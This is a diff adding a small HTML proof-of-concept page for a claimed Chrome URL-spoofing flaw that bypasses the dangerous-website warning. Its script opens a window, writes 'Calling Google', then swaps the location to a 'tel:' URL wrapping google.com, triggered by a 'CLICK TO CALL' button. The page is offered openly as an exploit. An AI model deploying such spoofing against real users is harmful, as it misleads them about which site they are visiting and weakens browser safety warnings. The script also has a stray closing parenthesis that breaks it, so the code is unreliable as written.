@@ -1,0 +1,13 @@
+<html>
+<head>
+    <title>Chrome Url Spoofing (bypass dangerous website) vulnerability</title>
+</head>
+<script>
+function pwn() {
+    w = window.open();
+    w.document.write('<p>Calling Google</p>'));
+    setTimeout("w.location.replace('tel:https://google.com');",5);
+}
+</script>
+<h1><button href="#" onclick="pwn()">CLICK TO CALL</button></h1>
+</html>
